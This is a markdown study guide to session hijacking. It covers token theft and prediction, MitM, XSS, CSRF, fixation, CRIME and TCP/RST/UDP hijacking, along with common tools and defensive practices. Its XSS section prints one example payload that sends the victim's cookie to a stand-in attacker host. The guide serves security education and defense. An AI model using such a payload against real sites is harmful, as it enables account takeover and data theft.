# 🔐 Session Hijacking — Complete Guide

> A comprehensive reference covering what session hijacking is, why it works, how it happens, all attack types, tools used by hackers, and how to defend yourself.

---

## 📋 Table of Contents

1. [What is Session Hijacking?](#1-what-is-session-hijacking)
2. [Why Session Hijacking Succeeds](#2-why-session-hijacking-succeeds)
3. [How Session Hijacking Works](#3-how-session-hijacking-works)
4. [Types of Session Hijacking](#4-types-of-session-hijacking)
   - [Passive vs Active](#passive-vs-active-session-hijacking)
   - [Spoofing vs Hijacking](#spoofing-vs-hijacking)
5. [Session Hijacking in the OSI Model](#5-session-hijacking-in-the-osi-model)
6. [Application-Level Hijacking Techniques](#6-application-level-hijacking-techniques)
   - [Stealing, Guessing & Brute Forcing Session IDs](#stealing-guessing--brute-forcing-session-ids)
   - [Sniffing & Session ID Prediction](#sniffing--session-id-prediction)
   - [Man-in-the-Middle (MitM) Attack](#man-in-the-middle-mitm-attack)
   - [Man-in-the-Browser (MitB) Attack](#man-in-the-browser-mitb-attack)
   - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
   - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
   - [Session Replay Attack](#session-replay-attack)
   - [Session Fixation](#session-fixation)
   - [Session Hijacking via Proxy Servers](#session-hijacking-via-proxy-servers)
   - [CRIME Attack](#crime-attack)
   - [The Forbidden Attack](#the-forbidden-attack)
   - [Session Donation Attack](#session-donation-attack)
7. [Network-Level Hijacking Techniques](#7-network-level-hijacking-techniques)
   - [TCP/IP Hijacking](#tcpip-hijacking)
   - [IP Spoofing with Source-Routed Packets](#ip-spoofing-with-source-routed-packets)
   - [RST Hijacking](#rst-hijacking)
   - [UDP Hijacking](#udp-hijacking)
   - [Blind Hijacking](#blind-hijacking)
8. [Tools Used for Session Hijacking](#8-tools-used-for-session-hijacking)
9. [How to Protect Yourself](#9-how-to-protect-yourself)
10. [Quick Reference Summary](#10-quick-reference-summary)

---

## 1. What is Session Hijacking?

When you log into a website, the server assigns your browser a **session token** — a unique ID that keeps you authenticated. This token is what the server uses to recognize you between requests, so you don't have to log in on every page.

**The Risk:** An attacker can **steal or guess** that token and take over your entire session — without ever needing your password.

### Why This Attack Works

Authentication typically only happens **once** — at login. After that, the session token carries all the trust. If an attacker hijacks the token, they get:

- Full access to steal sensitive information
- The ability to impersonate you
- Control to disrupt or terminate the connection

### Dangerous Outcomes

| Attack Type | Description |
|-------------|-------------|
| **Man-in-the-Middle (MitM)** | Attacker secretly intercepts communication between you and the server |
| **Denial of Service (DoS)** | Attacker disrupts sessions to crash services or prevent access |
| **Identity Theft / Fraud** | Attacker acts as you, making purchases, changing credentials, or stealing data |

---

## 2. Why Session Hijacking Succeeds

Several weak security practices make session hijacking a highly effective attack:

### 🔓 No Account Lockout for Invalid Session IDs
Many websites do not flag or block repeated attempts to guess a session ID. This allows attackers to run **brute-force attacks** indefinitely — trying millions of IDs until one works — with zero warnings or alerts sent.

### 🧮 Weak or Predictable Session IDs
Some servers generate session IDs using simple formulas like combining:
- Timestamps
- IP addresses
- Sequential counters (e.g., `10001`, `10002`, `10003`)

This makes it trivial for an attacker to observe a pattern and **predict the next valid token**. Even when a strong algorithm is used, if the token is **short** (e.g., 4 digits), it can be cracked quickly by exhausting all possibilities.

### 🍪 Improper Session ID Handling
If session IDs are not adequately protected, attackers can trick browsers into exposing them through:
- **DNS poisoning** — redirecting traffic to a malicious server
- **Cross-Site Scripting (XSS)** — injecting malicious scripts into web pages
- **Browser bugs** — exploiting vulnerabilities in the browser itself

### ⏳ Indefinite Session Timeouts
The "Remember Me" checkbox is convenient, but if a session ID **never expires**, attackers have unlimited time to steal and use it. Combined with access to cookies or a vulnerable proxy server, session hijacking becomes even faster.

### 🌐 TCP/IP Vulnerabilities
Most internet communication relies on TCP/IP, which has **built-in design flaws** that attackers can exploit to intercept and manipulate sessions at the network level.

### 🔐 Lack of Encryption
If session IDs are transmitted without proper encryption (e.g., over plain HTTP), attackers can **sniff them with ease** on unprotected networks. Even websites using SSL can be vulnerable if the session ID itself isn't secured correctly.

---

## 3. How Session Hijacking Works

Session hijacking is often easier than breaking in from scratch. If an attacker can find an active session, they can take it over, stay connected for hours, and act as the legitimate user without raising suspicion.

### Step-by-Step Process

```
[1] Track the Connection
         |
         | Attacker uses network sniffers to monitor traffic
         | and capture sequence/acknowledgement numbers
         v
[2] Desynchronize the Session
         |
         | Attacker floods the server with junk data
         | causing sequence numbers to drift out of sync
         v
[3] Inject Spoofed Packets
         |
         | Attacker crafts fake packets matching the victim's identity
         | and injects them into the connection
         v
[4] Session Takeover
         |
         | Attacker sends commands, steals data, or relays
         | and modifies communication in real time
         v
[RESULT] Full control of the victim's active session
```

### The TCP Three-Way Handshake Exploit

The attack heavily exploits the **TCP three-way handshake** (SYN → SYN-ACK → ACK):

1. The attacker sniffs or guesses the **sequence numbers** during the handshake
2. They craft packets with those sequence numbers and the victim's IP
3. The server accepts the spoofed packets as legitimate — the session is hijacked

> ⚠️ **Note:** If the attacker miscalculates, the server may flood the network with ACK packets, potentially exposing the attack. But when executed correctly, it is nearly impossible to detect until it's too late.

---

## 4. Types of Session Hijacking

### Passive vs Active Session Hijacking

| Feature | Passive Hijacking | Active Hijacking |
|--------|-------------------|-----------------|
| **Goal** | Observe and collect data silently | Take full control of the session |
| **Attacker Involvement** | Background monitoring only | Actively interferes and impersonates |
| **Method** | Network sniffers capturing credentials | Man-in-the-Middle, injection attacks |
| **Detection** | Very hard to detect | Slightly more detectable |
| **Countermeasure** | Encryption (HTTPS, Kerberos, OTP systems) | Strong auth, session regen, encryption |

#### Passive Hijacking — Deep Dive
The attacker uses **sniffers** to silently capture all network traffic, including usernames, passwords, and session tokens. They collect this data and use it later to log in as the legitimate user. It's like someone listening to a private phone call without speaking — dangerous precisely because it's invisible.

#### Active Hijacking — Deep Dive
The attacker doesn't just observe; they **take over**. The most common form is the **Man-in-the-Middle attack**, where the attacker sits between you and the server, intercepting and potentially modifying everything in transit. Modern operating systems use randomized sequence numbers, making this harder — but not impossible.

---

### Spoofing vs Hijacking

| | IP Spoofing | Session Hijacking |
|---|-------------|------------------|
| **Action** | Pretends to be someone else (new identity) | Takes over an existing active session |
| **Session Required?** | No — can start a new session | Yes — requires an active session to steal |
| **Sequence Numbers Needed?** | Not always | Yes — critical to matching the TCP state |
| **Analogy** | Walking in with a fake ID | Grabbing a seat someone already occupies |

---

## 5. Session Hijacking in the OSI Model

Session hijacking can occur at **two main OSI layers**:

### 🌐 Network Level (Layer 3–4)
- Targets underlying protocols: **TCP** or **UDP**
- Intercepts data during transmission between client and server
- Does not need to target a specific web application
- Like tapping a phone line — gathers everything needed to impersonate the user
- Often used as the **first step** before escalating to application-level attacks

### 🖥️ Application Level (Layer 7)
- Targets the **session ID** directly
- Attacker steals or crafts a session token to hijack an existing session or create a new unauthorized one
- Requires knowledge of how the web application manages sessions

> 💡 Both levels often work together: an attacker may start at the **network level** to capture initial data, then use that to **jump into the application layer** and take over the session completely.

---

## 6. Application-Level Hijacking Techniques

### Stealing, Guessing & Brute Forcing Session IDs

Attackers use three primary methods to obtain valid session tokens:

#### Method 1 — Stealing
Directly extracting session IDs from the target system. Attackers use tools like **Wireshark** or **Riverbed Packet Analyzer** to sniff network traffic and extract session IDs hidden inside packets.

#### Method 2 — Guessing
Observing patterns in how session IDs are generated (e.g., incrementing by 1, time-based patterns) and predicting a valid token. Possible when servers use weak or non-random token generation.

#### Method 3 — Brute Forcing
Using automated software to try every possible session ID combination until a valid one is found. Against short token spaces (e.g., 4-digit tokens = 10,000 possible values), this can succeed rapidly — especially without rate-limiting in place.

---

### Sniffing & Session ID Prediction

```
Without Encryption (HTTP)
──────────────────────────
User ──[session_id=ABC123]──► Server
          ↑
     Attacker captures it with Wireshark
     → Replays ABC123 to impersonate user

With Predictable Tokens
────────────────────────
Server generates: 10001, 10002, 10003...
Attacker observes pattern → guesses 10004
→ Successfully impersonates next user
```

**Defense:** Use HTTPS, robust random number generators (CSPRNG), and rate limiting.

---

### Man-in-the-Middle (MitM) Attack

The attacker positions themselves **between the client and the server**, splitting the TCP connection into two channels:
- Client ↔ Attacker
- Attacker ↔ Server

The attacker can:
- **Monitor** all communication
- **Alter** data before forwarding it
- **Inject** fraudulent data (e.g., fake session IDs, modified transactions)

All while the client and server believe they are communicating directly.

---

### Man-in-the-Browser (MitB) Attack

An evolution of MitM — the attack occurs **inside the browser itself**, using a Trojan horse.

**How it works:**
1. Trojan infects the system and embeds code into the browser's configuration
2. On browser restart, the malicious code activates silently
3. It monitors user activity, targeting specific websites (especially banking)
4. It captures login credentials, session IDs, and modifies transactions in real time
5. The server processes the fraudulent transaction and sends a normal-looking receipt back to the user

> 🚨 **Dangerous because:** It can bypass SSL encryption, PKI, and even two-factor authentication — since the attack occurs inside the browser, after the security layer has already processed the data.

---

### Cross-Site Scripting (XSS)

Malicious **JavaScript is injected** into a vulnerable web page. When the victim loads the page or clicks a crafted link, the script executes silently in their browser and:
- Reads the session cookie
- Sends it to the attacker's server
- Attacker uses it to impersonate the victim

```
Attacker injects: <script>document.location='https://evil.com?c='+document.cookie</script>
Victim visits page → their cookie is sent to attacker → session hijacked
```

---

### Cross-Site Request Forgery (CSRF)

Unlike XSS, CSRF doesn't steal the session — it **exploits the trust a website has in the victim's browser**.

**How it works:**
1. Attacker creates a fake webpage with a hidden malicious form
2. Victim (already logged into the target site) visits the fake page
3. The hidden form auto-submits a request to the real website using the victim's active session
4. The server accepts it — it looks like it came from the legitimate user
5. Attacker's action (purchases, credential changes, fund transfers) is performed under the victim's name

---

### Session Replay Attack

```
Normal Flow:
  User ──[auth_token]──► Server → Access Granted

Replay Attack:
  Attacker captures token while eavesdropping
  Attacker ──[same token]──► Server → Access Granted (no password needed!)
```

The attacker captures the authentication token during transmission and simply **replays it** to the server. The server, trusting the token, grants access.

**Defenses:** Time-limited tokens, one-time-use tokens, HTTPS encryption.

---

### Session Fixation

The attacker **doesn't steal your session ID — they give you theirs**.

**Step-by-step:**
1. Attacker connects to the website and gets a valid session ID (e.g., `SID=12345`)
2. Attacker sends victim a link containing that session ID (via email, phishing, etc.)
3. Victim clicks the link and logs in — the server uses the existing `SID=12345` without generating a new one
4. Attacker, knowing `SID=12345`, now has full access to the victim's authenticated session

**Root Cause:** The server fails to generate a **new session ID after login**.

**Delivery methods used by attackers:**
- Embedding the session ID in a URL parameter
- Hiding it in a form field
- Setting it via cookies

---

### Session Hijacking via Proxy Servers

1. Attacker lures victim with a fake-but-convincing link
2. Victim clicks — they are redirected to the **attacker's server**, not the real one
3. Attacker acts as a **proxy**: forwards victim's requests to the real server
4. In doing so, attacker captures all session cookies, tokens, and credentials
5. Attacker now hijacks the session and impersonates the victim silently

The victim sees normal responses and suspects nothing.

---

### CRIME Attack

**CRIME** = *Compression Ratio Info-leak Made Easy*

Targets vulnerabilities in the **compression mechanisms** of HTTPS/TLS/SPDY.

**How it works:**
1. An HTTPS session is established; the server sends a session cookie compressed before encryption
2. The attacker tricks the victim into visiting a malicious page
3. Attacker uses **ARP spoofing** to intercept HTTPS traffic
4. Attacker injects random characters into the cookie and observes **changes in compressed size**
5. Through statistical analysis of size changes, the attacker deduces the actual cookie value
6. Attacker replays the recovered cookie to hijack the session

> 💡 The insight: compression is shorter when data repeats. By injecting guesses and watching the size, an attacker can reconstruct the original cookie byte by byte.

---

### The Forbidden Attack

A Man-in-the-Middle attack exploiting **cryptographic nonce reuse** in TLS.

A **nonce** is a random value that should only be used **once** in a TLS handshake. If a flawed TLS implementation reuses the same nonce:

1. Attacker monitors the TLS handshake and captures the reused nonce
2. Attacker generates their own authentication keys using that nonce
3. Attacker takes control of the encrypted session
4. All traffic between victim and server now flows through the attacker
5. Attacker injects malicious content: JavaScript, fake form fields, credential harvesters

**Used to steal:** Passwords, bank account numbers, social security numbers.

---

### Session Donation Attack

The attacker **"donates" their own session ID to the victim**.

1. Attacker logs into a service (e.g., a bank) and obtains their valid session ID
2. Attacker creates a malicious link embedding that session ID
3. Victim clicks the link — their browser uses the attacker's session ID
4. Victim enters personal details (login, payment info) — all linked to the **attacker's session**
5. Attacker now has everything the victim entered, with zero need to steal credentials

The clever part: the attacker never needs to intercept traffic — they **voluntarily give you the trap**.

---

## 7. Network-Level Hijacking Techniques

Network-level hijacking is especially powerful because it:
- Does **not** require access to the victim's host
- Does **not** need to be tailored to a specific application
- Targets the **transport and internet protocols** all web apps rely on

### Understanding the TCP 3-Way Handshake

```
Client (Jordan)              Server
       │─────── SYN ──────────►│   "I want to connect"
       │◄──── SYN + ACK ───────│   "Okay, here's my ISN (Initial Sequence Number)"
       │─────── ACK ──────────►│   "Got it. Connection established."
       │                        │
       └────── Data flows ──────┘
```

The **sequence and acknowledgement numbers** are the keys to the session. Attackers who can guess or sniff these can **inject themselves into the connection**.

---

### TCP/IP Hijacking

1. Victim (e.g., Jordan) and server have an established TCP connection
2. Attacker (on the same network) **sniffs the sequence numbers** of the session
3. Attacker sends **spoofed packets** using the victim's IP address
4. Server redirects all traffic to the attacker's machine
5. Victim's connection hangs (frozen); attacker communicates with server on victim's behalf
6. Attacker gains unauthorized access — potentially to OTP-protected systems

> **Requirement:** Attacker must be on the **same network** as the victim. The target server can be anywhere.

---

### IP Spoofing with Source-Routed Packets

1. Attacker spoofs the IP address of a **trusted host** already communicating with the server
2. Attacker uses **Source Routing** to specify an explicit path for forged packets
3. Attacker manipulates sequence and acknowledgement numbers
4. Injects forged packets that the server processes **before the legitimate client can respond**
5. Session is desynchronized — legitimate client's packets are dropped
6. Attacker fully controls the session and can redirect communication

> **Extra danger:** This attack actively disrupts the legitimate client, leaving the attacker in complete control.

---

### RST Hijacking

1. Attacker crafts a **TCP RST (Reset) packet** targeting an active connection
2. Uses a **spoofed source IP** (victim's IP) and **predicts the correct ACK number**
3. The victim's machine receives the RST and immediately **terminates the connection**
4. Attacker steps in to the now-vacated session

**Tools used:** Colasoft Packet Builder, TCPdump

---

### UDP Hijacking

UDP is **connectionless** — it has no sequence numbers or handshake mechanism. This makes it inherently easier to exploit:

1. **Spoof Source IP:** Attacker sends UDP packets pretending to be from a legitimate host
2. **Intercept Traffic:** Forged packets are injected into the communication stream with malicious payloads
3. **Manipulate Communication:** Attacker alters the application's behavior or gains unauthorized access

Can be enhanced with a **Man-in-the-Middle attack** that also blocks the legitimate server's replies entirely.

---

### Blind Hijacking

The attacker cannot see responses from the server or victim. They must **guess sequence numbers** without any feedback:

- In every TCP session, sequence numbers maintain ordered data flow
- Attacker tries to predict these numbers to inject packets
- Like "playing darts in the dark" — requires guesswork
- If guessed correctly, the server accepts the attacker's packets as legitimate

Modern OS randomization of sequence numbers makes this harder, but not impossible.

---

## 8. Tools Used for Session Hijacking

### 🔧 Burp Suite
One of the most popular tools among security professionals. A comprehensive platform for **web application security testing**.

**Capabilities:**
- Intercept, modify, and forward HTTP/HTTPS requests
- Capture and analyze session tokens
- Manipulate cookies to test hijack scenarios
- Replay requests with modified session data
- Assess vulnerabilities in session management systems

> Primarily used for **penetration testing** and ethical security auditing.

---

### 🔧 Hetty (he)
A lightweight HTTP security research toolkit designed for **testing and analyzing web applications**.

**Key Features:**
- Acts as a **machine-in-the-middle HTTP proxy**
- Advanced search tools for filtering specific requests/responses
- Built-in **HTTP client** to manually craft and replay requests
- Real-time **request/response interception** — review, edit, cancel, or forward traffic
- Excellent for spotting session management vulnerabilities

---

### 🔧 Caido
A web security auditing toolkit for intercepting and inspecting HTTP requests **in real time while browsing**.

**Key Features:**
- Customize and test requests using **large wordlists** for automated testing
- Modify incoming requests using **regex rules** for automatic real-time alterations
- Resend requests to manually test specific endpoints
- Analyze and exploit session hijacking patterns and parameter tampering
- Flexible and powerful for web security professionals

---

### 🔧 Bettercap
A portable framework written in **Go**, widely used by security researchers, red teamers, and reverse engineers.

**Key Features:**
- Wi-Fi network monitoring, traffic interception, and **Man-in-the-Middle attacks**
- Inject malicious packets into wireless networks
- Target **Bluetooth Low Energy (BLE)** devices
- Support for **Wireless HID devices** (keyboards, mice) for physical security testing
- Full support for **IPv4 and IPv6** networks — an all-in-one network attack framework
- Essential for comprehensive **network security assessments**

---

## 9. How to Protect Yourself

### 🔒 Secure Connections
- Use **SSH or VPNs** for all sensitive communications
- Always pass authentication cookies over **HTTPS only**
- Never send session IDs over unencrypted HTTP

### 🍪 Cookie Protection
- Set the **`HttpOnly`** attribute on cookies to prevent JavaScript access
- Set the **`SameSite`** attribute to limit cross-origin cookie sending
- Set the **`Secure`** flag so cookies are only sent over HTTPS

### 🔑 Session ID Best Practices
- **Regenerate session IDs** after every successful login
- Use **strong, cryptographically random session keys** (use a CSPRNG)
- **Never embed session IDs in URLs** — they're trivially stolen via browser history, logs, and referrer headers
- Use encrypted, server-side storage for session identifiers

### 🔐 Encryption in Transit
- Enforce **SSL/TLS** for all data in transit
- This ensures intercepted data is useless without the decryption key

### 🔄 Session Timeouts
- Implement **automatic session timeouts** after a period of inactivity
- Avoid indefinite "Remember Me" sessions where possible

### 🌐 Network Configuration
- Switch from **hub-based to switch-based networks** to reduce ARP spoofing risk
- Monitor for ARP cache poisoning attempts

### 🧑‍💻 User Practices
- **Always log out** of applications, especially on shared or public devices
- Use **unique, strong passwords** for every account
- Enable **Multi-Factor Authentication (MFA)** — makes stolen session tokens much harder to abuse
- Be suspicious of links containing session IDs or unusual URL parameters

### 🔍 Monitoring & Detection
- Watch for **suspicious session activity** — logins from unusual locations, odd behavior
- Implement **behavioral biometrics** to detect anomalous session usage
- Log and alert on **impossible travel** scenarios (logins from geographically distant locations in short time)

### 🛠️ Developer Responsibilities
- Always generate a **fresh session ID after login** (prevents session fixation)
- Implement **rate limiting** on session ID validation endpoints (prevents brute force)
- Use robust random number generators for token generation
- Validate session tokens server-side with proper expiration logic

---

## 10. Quick Reference Summary

| Attack | Layer | Key Mechanism | Primary Defense |
|--------|-------|---------------|-----------------|
| **Sniffing** | Network | Capturing unencrypted session tokens | HTTPS everywhere |
| **Session Prediction** | Application | Guessing weak/sequential tokens | CSPRNG tokens |
| **Brute Force** | Application | Trying all possible token values | Rate limiting + long tokens |
| **MitM** | Network/App | Intercepting TCP stream | TLS, certificate pinning |
| **MitB** | Application | Trojan inside browser | Antivirus, browser integrity |
| **XSS** | Application | Injected JS steals cookie | `HttpOnly` cookies, CSP |
| **CSRF** | Application | Forged request using active session | `SameSite`, CSRF tokens |
| **Session Replay** | Application | Reusing captured auth tokens | Short-lived / OTP tokens |
| **Session Fixation** | Application | Victim uses attacker's session ID | Regen ID on login |
| **Proxy Hijacking** | Application | Attacker as middleman via malicious link | Awareness, HTTPS |
| **CRIME** | Network | Compression side-channel on cookies | Disable compression |
| **Forbidden Attack** | Network | TLS nonce reuse | Proper TLS implementation |
| **Session Donation** | Application | Attacker gives victim their session ID | Regen ID on login |
| **TCP/IP Hijacking** | Network | Spoofed packets with predicted seq# | Encryption, network segmentation |
| **RST Hijacking** | Network | Forged RST packet terminates connection | TCP auth extensions |
| **UDP Hijacking** | Network | IP spoofing on connectionless protocol | UDP authentication, VPN |
| **Blind Hijacking** | Network | Guessing seq# without seeing responses | Randomized ISNs |

---

## ⚠️ Disclaimer

This document is intended **strictly for educational and ethical cybersecurity purposes** — to help developers, security researchers, and students understand how session hijacking works so they can **build better defenses**. Do not use this knowledge to attack systems you do not own or have explicit authorization to test.

---

*Reference: "Want to Become a Hacker? Learn Session Hijacking" — compiled and structured for study purposes.*
